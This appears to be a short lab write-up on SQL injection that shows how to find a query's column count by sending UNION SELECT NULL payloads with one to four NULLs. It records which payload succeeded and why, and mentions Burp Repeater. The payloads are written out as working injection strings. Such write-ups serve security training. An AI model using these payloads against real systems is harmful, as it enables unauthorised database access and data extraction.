Method 1 – UNION SELECT NULL

Tested different numbers of NULL values until the query executed successfully.

Payloads used:

' UNION SELECT NULL--

❌ SQL Error

' UNION SELECT NULL,NULL--

❌ SQL Error

' UNION SELECT NULL,NULL,NULL--

✅ HTTP 200 OK

' UNION SELECT NULL,NULL,NULL,NULL--

❌ SQL Error

Result

The original SQL query returns 3 columns.

Explanation

The UNION operator requires both SELECT statements to return the same number of columns.

NULL values are used because they are compatible with almost all SQL data types, making them ideal for determining the correct column count.

Key Takeaways
Always determine the number of columns before extracting data.
Use NULL values to avoid data type mismatch errors.
Burp Repeater is useful for testing SQL injection payloads interactively.
